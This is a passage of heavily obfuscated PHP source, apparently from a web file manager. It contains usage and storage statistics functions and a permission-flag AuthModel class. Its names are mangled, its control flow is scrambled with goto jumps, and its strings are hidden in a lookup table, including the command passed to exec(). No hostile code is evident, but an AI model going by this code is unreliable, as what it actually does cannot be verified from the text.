$Bî¦ìÉãŠ)); goto BÊ¦ÁĞÏ„; fØˆ©š‚: $eè”ß¹¤¯» = Model($dì¬áé«ë®[751])->where($c¦…Óè–)->sum($dì¬áé«ë®[77]); $aí±Æ‚Ñ† = array($dì¬áé«ë®[216] => $aªÏ“¬‘™ª, $dì¬áé«ë®[695] => (int) $Eõ¥Îˆ’µ˜, $dì¬áé«ë®[1997] => (int) $c†¢»˜¹Ë, $dì¬áé«ë®[1998] => (int) $E™Ÿ „¯İÁ, $dì¬áé«ë®[1999] => (int) $eè”ß¹¤¯»); return $this->insert($aí±Æ‚Ñ†); goto Cœø‹ÀÕö; Cœø‹ÀÕö: } public function trend($F»¿Û±¦‡ , $F¹ÏåÖã¤×) { goto fí¥‹‹š; b¡‡ÌÌ·ä: if ($FùäéÛéº¹ && $F¹ÏåÖã¤× != $fã¹á†¹Şğ[1378]) { $cÛ¹„­÷Ñ… = $FùäéÛéº¹[0][$fã¹á†¹Şğ[216]]; $B­¾ã¶›Éò = $this->validDate($F¹ÏåÖã¤×, $cÛ¹„­÷Ñ…); $BĞ °³Š¸ä = array(); $FÃâº©¥Ü© = array_to_keyvalue($FùäéÛéº¹, $fã¹á†¹Şğ[216]); foreach ($B­¾ã¶›Éò as $DŠªã§öÔÇ) { if (isset($FÃâº©¥Ü©[$DŠªã§öÔÇ])) { $bÊŒ‹Ù‘† = $FÃâº©¥Ü©[$DŠªã§öÔÇ]; } else { $bÊŒ‹Ù‘† = end($FùäéÛéº¹); $bÊŒ‹Ù‘†[$fã¹á†¹Şğ[216]] = $DŠªã§öÔÇ; if ($F»¿Û±¦‡  == $fã¹á†¹Şğ[539]) { $bÊŒ‹Ù‘†[$fã¹á†¹Şğ[1993]] = $bÊŒ‹Ù‘†[$fã¹á†¹Şğ[1994]] = 0; } } $BĞ °³Š¸ä[] = $bÊŒ‹Ù‘†; } $FùäéÛéº¹ = $BĞ °³Š¸ä; } $CÕğ–¤‘‹® = array($fã¹á†¹Şğ[539] => array($fã¹á†¹Şğ[697] => LNG($fã¹á†¹Şğ[2009]), $fã¹á†¹Şğ[1993] => LNG($fã¹á†¹Şğ[2010]), $fã¹á†¹Şğ[1994] => LNG($fã¹á†¹Şğ[2011])), $fã¹á†¹Şğ[1995] => array($fã¹á†¹Şğ[695] => LNG($fã¹á†¹Şğ[2012]), $fã¹á†¹Şğ[1997] => LNG($fã¹á†¹Şğ[2013]), $fã¹á†¹Şğ[1998] => LNG($fã¹á†¹Şğ[2014]), $fã¹á†¹Şğ[1999] => LNG($fã¹á†¹Şğ[2015]))); $C”Ëöø™÷‹ = array($fã¹á†¹Şğ[539] => $fã¹á†¹Şğ[2016], $fã¹á†¹Şğ[1995] => $fã¹á†¹Şğ[77]); goto aˆ‰Ø¯ø‰²; aİ®›ë¶ˆç: return $DŠ³Ò•õó; goto dª“¯é”»…; aˆ‰Ø¯ø‰²: if (empty($FùäéÛéº¹)) { $DŠªã§öÔÇ = date($fã¹á†¹Şğ[2000], strtotime($fã¹á†¹Şğ[2001])); $D¢‡óàˆå = array($fã¹á†¹Şğ[216] => $DŠªã§öÔÇ); foreach ($CÕğ–¤‘‹®[$F»¿Û±¦‡ ] as $CâÖİ•ôÃÓ => $fÇÒÙµëİ“) { $D¢‡óàˆå[$CâÖİ•ôÃÓ] = 0; } $FùäéÛéº¹[] = $D¢‡óàˆå; } $DŠ³Ò•õó = array(); foreach ($FùäéÛéº¹ as $fÇÒÙµëİ“) { if ($F»¿Û±¦‡  == $fã¹á†¹Şğ[1995] && $fÇÒÙµëİ“[$fã¹á†¹Şğ[1997]] > $fÇÒÙµëİ“[$fã¹á†¹Şğ[695]]) { $fÇÒÙµëİ“[$fã¹á†¹Şğ[1997]] = $fÇÒÙµëİ“[$fã¹á†¹Şğ[695]]; } foreach ($CÕğ–¤‘‹®[$F»¿Û±¦‡ ] as $CâÖİ•ôÃÓ => $A³¾ì‹Ã„) { $bÊŒ‹Ù‘† = array($fã¹á†¹Şğ[216] => $fÇÒÙµëİ“[$fã¹á†¹Şğ[216]], $fã¹á†¹Şğ[1309] => $A³¾ì‹Ã„); $bÊŒ‹Ù‘†[$C”Ëöø™÷‹[$F»¿Û±¦‡ ]] = isset($fÇÒÙµëİ“[$CâÖİ•ôÃÓ]) ? $fÇÒÙµëİ“[$CâÖİ•ôÃÓ] : 0; $DŠ³Ò•õó[] = $bÊŒ‹Ù‘†; } } goto aİ®›ë¶ˆç; fí¥‹‹š: $fã¹á†¹Şğ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->init($F»¿Û±¦‡ )) { return !1; } $FùäéÛéº¹ = $this->trendList($F»¿Û±¦‡ ); goto b¡‡ÌÌ·ä; dª“¯é”»…: } public function validDate($e†®ë±ÇÄõ, $aªÜÒÖœ„) { goto a”ôÌ—‘î; a”ôÌ—‘î: $B¤ïò®×˜÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¡ø¨³ª‚Ø = date($B¤ïò®×˜÷[2000], strtotime($B¤ïò®×˜÷[2001])); $FŠ«äñé¨ = array($F¡ø¨³ª‚Ø); goto b¼ÎØ ­ãÉ; CÙõÎõ™: return $FŠ«äñé¨; goto e›ĞĞªìÁÃ; b¼ÎØ ­ãÉ: switch ($e†®ë±ÇÄõ) { case $B¤ïò®×˜÷[1385]: $CøÇ»ƒ„»è = mktime(0, 0, 0, date($B¤ïò®×˜÷[2017]), date($B¤ïò®×˜÷[2018]) - date($B¤ïò®×˜÷[1208]) + 7 - 7, date($B¤ïò®×˜÷[2019])); $E„ „Ú¬‹ğ = 0; do { $EëÁôµ† = date($B¤ïò®×˜÷[2000], $CøÇ»ƒ„»è - 3600 * 24 * 7 * $E„ „Ú¬‹ğ); $FŠ«äñé¨[] = $EëÁôµ†; $E„ „Ú¬‹ğ++; } while ($aªÜÒÖœ„ < $EëÁôµ†); break; case $B¤ïò®×˜÷[1383]: $E„ „Ú¬‹ğ = 1; do { $b²¢—ÈíÄ = date($B¤ïò®×˜÷[2020], strtotime("\x2d\x20{$E„ „Ú¬‹ğ}\40\155\x6f\156\164\150\x73")); $FŠ«äñé¨[] = $b²¢—ÈíÄ; $E„ „Ú¬‹ğ++; } while ($aªÜÒÖœ„ < $b²¢—ÈíÄ); break; case $B¤ïò®×˜÷[1688]: $cÂˆáÁ… = (int) date($B¤ïò®×˜÷[2019], strtotime($aªÜÒÖœ„)); $CŸ¯‘¿‰¨¤ = (int) date($B¤ïò®×˜÷[2019]); if ($cÂˆáÁ… >= $CŸ¯‘¿‰¨¤) { break; } for ($cÂˆáÁ…; $cÂˆáÁ… < $CŸ¯‘¿‰¨¤; $cÂˆáÁ…++) { $FŠ«äñé¨[] = $cÂˆáÁ… . $B¤ïò®×˜÷[2021]; } break; default: break; } if ($aªÜÒÖœ„ > end($FŠ«äñé¨)) { array_pop($FŠ«äñé¨); } sort($FŠ«äñé¨); goto CÙõÎõ™; e›ĞĞªìÁÃ: } public function listTable($F¢“š«÷·Ş) { $dø‡ÌØÎ™ù = ucfirst($F¢“š«÷·Ş); return Model($dø‡ÌØÎ™ù)->listData(); } public function option($eøîÅ¸İ§Ì) { $F¤³´†™Úì = $_SERVER[ºÖÙÂŒäÉê‡][2022] . ucfirst($eøîÅ¸İ§Ì); return $this->{$F¤³´†™Úì}(); } private function optionUser() { goto EÒÌÁ©ÍØ; d¾âÓ‡ó: $D·ñù•¹° = Model($f¤±²©²Â[481])->where($f‰‘©ŞÖ«»)->count($f¤±²©²Â[1403]); return array($f¤±²©²Â[692] => (int) $Aáí¾¹å©Ÿ, $f¤±²©²Â[2026] => (int) ($Aáí¾¹å©Ÿ - $cõñó¸ãææ), $f¤±²©²Â[2027] => (int) $cõñó¸ãææ, $f¤±²©²Â[2028] => (int) $D·ñù•¹°, $f¤±²©²Â[2029] => $Fèé­òš¡æ); goto B–¤óƒœÇ; c°’•àŠ: $aÂÊ‹Û²µ = strtotime($f¤±²©²Â[2024]); $f‰‘©ŞÖ«» = array($f¤±²©²Â[2025] => array($f¤±²©²Â[920], $aÂÊ‹Û²µ)); $Fèé­òš¡æ = (int) Model($f¤±²©²Â[481])->where($f‰‘©ŞÖ«»)->count($f¤±²©²Â[1403]); goto eæã´¢¼¸²; eæã´¢¼¸²: if (!$Fèé­òš¡æ) { $Fèé­òš¡æ = 1; } $aÂÊ‹Û²µ = strtotime(date($f¤±²©²Â[2004])); $f‰‘©ŞÖ«» = array($f¤±²©²Â[2025] => array($f¤±²©²Â[920], $aÂÊ‹Û²µ)); goto d¾âÓ‡ó; EÒÌÁ©ÍØ: $f¤±²©²Â =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aáí¾¹å©Ÿ = Model($f¤±²©²Â[481])->count($f¤±²©²Â[1403]); $cõñó¸ãææ = Model($f¤±²©²Â[481])->where($f¤±²©²Â[2023])->count($f¤±²©²Â[1403]); goto c°’•àŠ; B–¤óƒœÇ: } private function optionFile() { goto E¬ğ¿‚‡Ù—; E¬ğ¿‚‡Ù—: $cèØî½ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $FëäÉÉ™’ = $this->sourceSize(); $A³ áÇ§ƒ = $FëäÉÉ™’[$cèØî½ø[77]]; goto b±ª¤£ì—©; B–‡®´ø´†: $E¾½Ç¾˜¬ = Model($cèØî½ø[751])->where($a²÷ã·©ÛÄ)->sum($cèØî½ø[77]); $eÅ“ÁÇ§„ = Model($cèØî½ø[751])->where($a²÷ã·©ÛÄ)->count($cèØî½ø[374]); return array($cèØî½ø[695] => $A³ áÇ§ƒ, $cèØî½ø[1997] => $e½ø„¦±Ñ, $cèØî½ø[2030] => $A³ áÇ§ƒ - $e½ø„¦±Ñ, $cèØî½ø[2031] => (int) $E¾½Ç¾˜¬, $cèØî½ø[697] => (int) $FÒœ¨æÏ„…, $cèØî½ø[2032] => (int) $eÅ“ÁÇ§„); goto fß”Ñ„³à; b±ª¤£ì—©: $e½ø„¦±Ñ = $FëäÉÉ™’[$cèØî½ø[1997]]; $FÒœ¨æÏ„… = Model($cèØî½ø[751])->where(array($cèØî½ø[375] => 0))->count($cèØî½ø[374]); $a²÷ã·©ÛÄ = array($cèØî½ø[375] => 0, $cèØî½ø[193] => array($cèØî½ø[920], strtotime(date($cèØî½ø[2004])))); goto B–‡®´ø´†; fß”Ñ„³à: } private function optionAccess() { $E—±Æ³Œ‰± =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($E—±Æ³Œ‰±[692] => $this->typeLogCnt(), $E—±Æ³Œ‰±[102] => $this->typeLogCnt($E—±Æ³Œ‰±[102]), $E—±Æ³Œ‰±[408] => $this->typeLogCnt($E—±Æ³Œ‰±[408]), $E—±Æ³Œ‰±[2033] => $this->typeLogCnt($E—±Æ³Œ‰±[2033]), $E—±Æ³Œ‰±[2034] => $this->typeLogCnt($E—±Æ³Œ‰±[2034]), $E—±Æ³Œ‰±[539] => $this->typeLogCnt($E—±Æ³Œ‰±[33], $E—±Æ³Œ‰±[2008])); } private function typeLogCnt($BîÇ…ñ¦šã = '', $c·Õ‹ˆˆ³Ì = "\151\x64") { goto Dàñ‡¬óšá; AÔÇÀàÓÔç: return (int) $d–éµ×‡›¯; goto b˜»í–Áó÷; A–Â·£œ˜: $e‹ˆ¡š¿ÎÒ = array($Fë¯ç›÷¢ä[193] => array($Fë¯ç›÷¢ä[920], $cßÌŒï°å“)); if ($BîÇ…ñ¦šã) { $e‹ˆ¡š¿ÎÒ[$Fë¯ç›÷¢ä[29]] = array($Fë¯ç›÷¢ä[7], $b÷óªöò´Ç[$BîÇ…ñ¦šã]); } $d–éµ×‡›¯ = Model($Fë¯ç›÷¢ä[2007])->where($e‹ˆ¡š¿ÎÒ)->count($c·Õ‹ˆˆ³Ì); goto AÔÇÀàÓÔç; Dàñ‡¬óšá: $Fë¯ç›÷¢ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $b÷óªöò´Ç = array($Fë¯ç›÷¢ä[102] => array($Fë¯ç›÷¢ä[2035], $Fë¯ç›÷¢ä[2036]), $Fë¯ç›÷¢ä[408] => array($Fë¯ç›÷¢ä[2037], $Fë¯ç›÷¢ä[2038]), $Fë¯ç›÷¢ä[2033] => array($Fë¯ç›÷¢ä[2039], $Fë¯ç›÷¢ä[2040]), $Fë¯ç›÷¢ä[2034] => array($Fë¯ç›÷¢ä[2041], $Fë¯ç›÷¢ä[2042]), $Fë¯ç›÷¢ä[2043] => array($Fë¯ç›÷¢ä[2044], $Fë¯ç›÷¢ä[2045], $Fë¯ç›÷¢ä[2046])); $cßÌŒï°å“ = strtotime(date($Fë¯ç›÷¢ä[2004])); goto A–Â·£œ˜; b˜»í–Áó÷: } private function optionServer() { goto b´¯˜¸¦É±; AÅñĞğ±¾: $AÏ›ßÊ›˜ó = array($E ’áåË½Œ[742] => $EŸ±Ö“…Ÿ[$E ’áåË½Œ[372]]); $A”ˆºÇ„’Ã = Model($E ’áåË½Œ[426])->where($AÏ›ßÊ›˜ó)->sum($E ’áåË½Œ[77]); $eóÍˆÛï„— = explode($E ’áåË½Œ[50], $_SERVER[$E ’áåË½Œ[137]]); goto B¬›´§«Á¯; b´¯˜¸¦É±: $E ’áåË½Œ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¨ÏÏæøÜ = $this->diskDriver(); $EŸ±Ö“…Ÿ = KodIO::defaultDriver(); goto AÅñĞğ±¾; E•¸Äôçãó: if ($DÅ­Ö¯—Û == $E ’áåË½Œ[723]) { $b²ëõâáÑ = explode($E ’áåË½Œ[1066], $Dà±—ŠÊÖ£[$E ’áåË½Œ[879]]); $DÅ­Ö¯—Û = $b²ëõâáÑ[0]; } if ($DÅ­Ö¯—Û == $E ’áåË½Œ[726] || $DÅ­Ö¯—Û == $E ’áåË½Œ[727]) { $aäğ˜·½ = Model()->db()->query($E ’áåË½Œ[2047]); $AÁ›ğÁàÍï = $aäğ˜·½[0] && isset($aäğ˜·½[0][$E ’áåË½Œ[1308]]) ? $aäğ˜·½[0][$E ’áåË½Œ[1308]] : 0; $DÅ­Ö¯—Û = $E ’áåË½Œ[2048] . ($AÁ›ğÁàÍï ? $E ’áåË½Œ[8] . $AÁ›ğÁàÍï : $E ’áåË½Œ[33]); } $aÌñÊ©áŒ = $GLOBALS[$E ’áåË½Œ[6]][$E ’áåË½Œ[342]][$E ’áåË½Œ[752]]; goto eÄ¼„¶•±å; B¬›´§«Á¯: $aÒêÜÕßã = $eóÍˆÛï„—[0]; $Dà±—ŠÊÖ£ = $GLOBALS[$E ’áåË½Œ[6]][$E ’áåË½Œ[17]]; $DÅ­Ö¯—Û = $Dà±—ŠÊÖ£[$E ’áåË½Œ[880]]; goto E•¸Äôçãó; eÄ¼„¶•±å: return array($E ’áåË½Œ[2049] => $D¨ÏÏæøÜ ? $D¨ÏÏæøÜ[$E ’áåË½Œ[2050]] : 0, $E ’áåË½Œ[2051] => $D¨ÏÏæøÜ ? $D¨ÏÏæøÜ[$E ’áåË½Œ[2052]] : 0, $E ’áåË½Œ[2053] => (int) $EŸ±Ö“…Ÿ[$E ’áåË½Œ[2050]] * 1024 * 1024 * 1024, $E ’áåË½Œ[2054] => (int) $A”ˆºÇ„’Ã, $E ’áåË½Œ[2055] => ucfirst($aÒêÜÕßã), $E ’áåË½Œ[2056] => $E ’áåË½Œ[2057] . PHP_VERSION, $E ’áåË½Œ[2058] => phpBuild64() ? 64 : 32, $E ’áåË½Œ[691] => str_replace($E ’áåË½Œ[2059], $E ’áåË½Œ[896], $DÅ­Ö¯—Û), $E ’áåË½Œ[342] => ucfirst($aÌñÊ©áŒ), $E ’áåË½Œ[28] => $_SERVER[$E ’áåË½Œ[2060]]); goto d¥ÑÆá˜î; d¥ÑÆá˜î: } private function diskDriver() { goto A†óÌ·Ã¤¹; A†óÌ·Ã¤¹: $e¶´ªÒğïæ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b×´©ÛÇ = $e¶´ªÒğïæ[8]; $DÔñ©›«¸Ï = $GLOBALS[$e¶´ªÒğïæ[6]][$e¶´ªÒğïæ[2061]] == $e¶´ªÒğïæ[2062]; goto aã’ŠåÑ‹è; båµ£Í‚›: $C”¤§©õôõ = $AÔø–Á±º» - @disk_free_space($b×´©ÛÇ); return array($e¶´ªÒğïæ[2050] => $AÔø–Á±º», $e¶´ªÒğïæ[2052] => $C”¤§©õôõ); goto d…İÄ“§·‡; aã’ŠåÑ‹è: if ($DÔñ©›«¸Ï) { $b×´©ÛÇ = $e¶´ªÒğïæ[2063]; if (function_exists($e¶´ªÒğïæ[2064])) { exec($e¶´ªÒğïæ[2065], $CÒˆ¶¿¸Â¸); $b×´©ÛÇ = $CÒˆ¶¿¸Â¸[1] . $e¶´ªÒğïæ[8]; } } if (!file_exists($b×´©ÛÇ)) { return; } $AÔø–Á±º» = @disk_total_space($b×´©ÛÇ); goto båµ£Í‚›; d…İÄ“§·‡: } public function fileChart($BòÀ›àˆò) { goto A‡¸±à«Ê; A‡¸±à«Ê: $Dõ”¶Òí¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($BòÀ›àˆò[$Dõ”¶Òí¶[1403]])) { return Model($Dõ”¶Òí¶[751])->userFileTypeProfile($BòÀ›àˆò[$Dõ”¶Òí¶[1403]]); } if (isset($BòÀ›àˆò[$Dõ”¶Òí¶[2066]])) { return Model($Dõ”¶Òí¶[751])->groupFileTypeProfile($BòÀ›àˆò[$Dõ”¶Òí¶[2066]]); } goto fƒƒĞËà²Õ; fƒƒĞËà²Õ: $C¢Åñ˜É = $this->sourceSize(); $d¸ ‹šô˜Õ = array($Dõ”¶Òí¶[465] => 0, $Dõ”¶Òí¶[376] => 1); $C¼í³ƒ´÷‡ = Model($Dõ”¶Òí¶[751])->where($d¸ ‹šô˜Õ)->sum($Dõ”¶Òí¶[77]); goto fè¦£¾†¾; fè¦£¾†¾: $d¸ ‹šô˜Õ[$Dõ”¶Òí¶[376]] = 2; $fÂ¡”ŞÈœ­ = Model($Dõ”¶Òí¶[751])->where($d¸ ‹šô˜Õ)->sum($Dõ”¶Òí¶[77]); return array($Dõ”¶Òí¶[695] => $C¢Åñ˜É[$Dõ”¶Òí¶[77]], $Dõ”¶Òí¶[1997] => $C¢Åñ˜É[$Dõ”¶Òí¶[1997]], $Dõ”¶Òí¶[1998] => (int) $C¼í³ƒ´÷‡, $Dõ”¶Òí¶[1999] => (int) $fÂ¡”ŞÈœ­); goto Aƒª‘´ÌŞ; Aƒª‘´ÌŞ: } private function sourceSize() { $F×¼ÄÕ•‹ö =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¨™Ê¸¨ô¦ = Model($F×¼ÄÕ•‹ö[751])->where(array($F×¼ÄÕ•‹ö[375] => 0))->sum($F×¼ÄÕ•‹ö[77]); $bêØ©Û¦¶Ğ = Model($F×¼ÄÕ•‹ö[426])->sum($F×¼ÄÕ•‹ö[77]); if ($bêØ©Û¦¶Ğ > $D¨™Ê¸¨ô¦) { $bêØ©Û¦¶Ğ = $D¨™Ê¸¨ô¦; } return array($F×¼ÄÕ•‹ö[77] => (int) $D¨™Ê¸¨ô¦, $F×¼ÄÕ•‹ö[1997] => (int) $bêØ©Û¦¶Ğ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $dÉ‘¬³À¸Ğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e‚ğŠáÆ„ƒ = array(array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2067]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2069], $dÉ‘¬³À¸Ğ[2070] => 6, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2073]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2074], $dÉ‘¬³À¸Ğ[2070] => 1, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2075]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2076], $dÉ‘¬³À¸Ğ[2070] => 2, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2077]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2076], $dÉ‘¬³À¸Ğ[2070] => 3, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2078]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2079], $dÉ‘¬³À¸Ğ[2070] => 4, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_VIEW), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2080]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2081], $dÉ‘¬³À¸Ğ[2070] => 5, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($dÉ‘¬³À¸Ğ[391] => LNG($dÉ‘¬³À¸Ğ[2082]), $dÉ‘¬³À¸Ğ[2068] => $dÉ‘¬³À¸Ğ[2083], $dÉ‘¬³À¸Ğ[2070] => 7, $dÉ‘¬³À¸Ğ[2071] => 1, $dÉ‘¬³À¸Ğ[2072] => 0)); return $e‚ğŠáÆ„ƒ; } public static function authCheck($cÃîù¢Ÿ±ô, $fßæí×Â³ø) { $cÃîù¢Ÿ±ô = intval($cÃîù¢Ÿ±ô); if (_get($GLOBALS, $_SERVER[ºÖÙÂŒäÉê‡][461])) { return !0; } if ($cÃîù¢Ÿ±ô <= 0) { return !1; } if (($cÃîù¢Ÿ±ô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cÃîù¢Ÿ±ô & $fßæí×Â³ø); } public static function authCheckShow($bªÄ´à±ƒ) { return self::authCheck($bªÄ´à±ƒ, self::AUTH_SHOW); } public static function authCheckView($D³Øµ¥‚†¶) { return self::authCheck($D³Øµ¥‚†¶, self::AUTH_VIEW); } public static function authCheckDownload($C«³ƒŠƒœ™) { return self::authCheck($C«³ƒŠƒœ™, self::AUTH_DOWNLOAD); } public static function authCheckUpload($F£Ñ·Ù¤) { return self::authCheck($F£Ñ·Ù¤, self::AUTH_UPLOAD); } public static function authCheckEdit($dƒäÁÑÍ¢¡) { return self::authCheck($dƒäÁÑÍ¢¡, self::AUTH_EDIT); } public static function authCheckRemove($E°–æŠîÈ¬) { return self::authCheck($E°–æŠîÈ¬, self::AUTH_REMOVE); } public static function authCheckShare($B«ä©µÑ—) { return self::authCheck($B«ä©µÑ—, self::AUTH_SHARE); } public static function authCheckComment($a×‡ÑÂÖ÷®) { return self::authCheck($a×‡ÑÂÖ÷®, self::AUTH_COMMENT); } public static function authCheckEvent($CØ–¢åÂõƒ) { return self::authCheck($CØ–¢åÂõƒ, self::AUTH_EVENT); } public static function authCheckRoot($eŠéœİù¼ì) { return self::authCheck($eŠéœİù¼ì, self::AUTH_ROOT); } public static function authDisable($DèÕË¼×”, $Fó‘¯ñÕ•) { if (intval($DèÕË¼×”) <= 0) { return 0; } return intval($DèÕË¼×”) & ~$Fó‘¯ñÕ•; } public $optionType = "\123\x79\x73\x74\x65\x6d\56\x73\157\x75\x72\x63\x65\101\x75\x74\x68\114\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\x61\x75\164\x68", "\x6c\141\x62\x65\154", "\144\151\163\x70\154\141\x79", "\163\x79\163\164\145\x6d", "\163\157\162\164"); public function initData() { $BÑô—ëÕÄ = $this->authDefault(); foreach ($BÑô—ëÕÄ as $b¤¯…®·‘) { $this->add($b¤¯…®·‘); } } public function listData($EÂ¤¦ÛÈã£ = false, $Bê…‹ê”‰Ô = "\x73\157\x72\164", $cÊÒåŸ…¾  = false) { return parent::listData($EÂ¤¦ÛÈã£, $Bê…‹ê”‰Ô, $cÊÒåŸ…¾ ); } public function update($dÆ…‡£ìÀ™, $D¥‘ŸÂÑ) { $bªÁƒæ¥ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $e½¿Ì×ùàÌ = parent::listData($dÆ…‡£ìÀ™); $eÈù‘Ô‘Ï² = $this->findByName($D¥‘ŸÂÑ[$bªÁƒæ¥ó[28]]); if (!$e½¿Ì×ùàÌ || $eÈù‘Ô‘Ï² && $eÈù‘Ô‘Ï²[$bªÁƒæ¥ó[372]] != $e½¿Ì×ùàÌ[$bªÁƒæ¥ó[372]]) { return !1; } $this->filterAuth($D¥‘ŸÂÑ[$bªÁƒæ¥ó[381]]); return parent::update($dÆ…‡£ìÀ™, $D¥‘ŸÂÑ); } public function remove($aÜ‡ëÚ¬µ) { $A÷‰ƒœÏ‚ = parent::listData($aÜ‡ëÚ¬µ); if (!$A÷‰ƒœÏ‚ || $A÷‰ƒœÏ‚[$_SERVER[ºÖÙÂŒäÉê‡][1070]]) { return !1; } return parent::remove($aÜ‡ëÚ¬µ); } public function add($FÕùÊß…òĞ = array()) { goto EºŸ°•¢÷â; A‹çÇùòÄŞ: return parent::insert($FÕùÊß…òĞ); goto B„Õ¼º‚¶; FŠ¢Ì…â‚: $FÕùÊß…òĞ = array_merge($AÄ¡ëï¥±º, $FÕùÊß…òĞ); $FÕùÊß…òĞ[$c§´¨„‡À’[2087]] = $this->getSort(); $this->filterAuth($FÕùÊß…òĞ[$c§´¨„‡À’[381]]); goto A‹çÇùòÄŞ; EºŸ°•¢÷â: $c§´¨„‡À’ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->findByName($FÕùÊß…òĞ[$c§´¨„‡À’[28]])) { return !1; } $AÄ¡ëï¥±º = array($c§´¨„‡À’[28] => $c§´¨„‡À’[33], $c§´¨„‡À’[381] => 1, $c§´¨„‡À’[2084] => $c§´¨„‡À’[2085], $c§´¨„‡À’[2086] => 1, $c§´¨„‡À’[1070] => 0, $c§´¨„‡À’[2087] => 0); goto FŠ¢Ì…â‚; B„Õ¼º‚¶: } private function getSort() { $d”¦½é‰´İ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eˆ„ÛÄ‡ÍŞ = parent::listData(); $C÷Ş†Ñ¾ = array_to_keyvalue($Eˆ„ÛÄ‡ÍŞ, $d”¦½é‰´İ[33], $d”¦½é‰´İ[2087]); return empty($C÷Ş†Ñ¾) ? 0 : max($C÷Ş†Ñ¾) + 1; } private function filterAuth(&$FÙ­¾ƒªôø) { goto A‡¶ÀöŠàô; D©ŠÔª¶«Ø: foreach ($eõß¿º°¾Â as $Bâš´¢­Ñ†) { if ($FÙ­¾ƒªôø & $Bâš´¢­Ñ†) { $A®é¡Ğ×Ùì[] = $Bâš´¢­Ñ†; } } if (in_array(self::AUTH_ROOT, $A®é¡Ğ×Ùì)) { $FÙ­¾ƒªôø = array_sum($eõß¿º°¾Â); return; } $câÉ¡µéÀĞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e­œÏ²Æ; A‡¶ÀöŠàô: if (!$FÙ­¾ƒªôø) { return; } $eõß¿º°¾Â = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A®é¡Ğ×Ùì = array(); goto D©ŠÔª¶«Ø; e­œÏ²Æ: foreach ($A®é¡Ğ×Ùì as $Bâš´¢­Ñ†) { if (isset($câÉ¡µéÀĞ[$Bâš´¢­Ñ†])) { $A®é¡Ğ×Ùì = array_merge($A®é¡Ğ×Ùì, $câÉ¡µéÀĞ[$Bâš´¢­Ñ†]); } } $A®é¡Ğ×Ùì[] = self::AUTH_SHOW; $FÙ­¾ƒªôø = array_sum(array_unique($A®é¡Ğ×Ùì)); goto e™ÖÏ„ØŸ; e™ÖÏ„ØŸ: } public function sort($E’ùÇ‘ä™…, $DÜ©…ó‘ô) { return parent::update($E’ùÇ‘ä™…, $DÜ©…ó‘ô); } } class 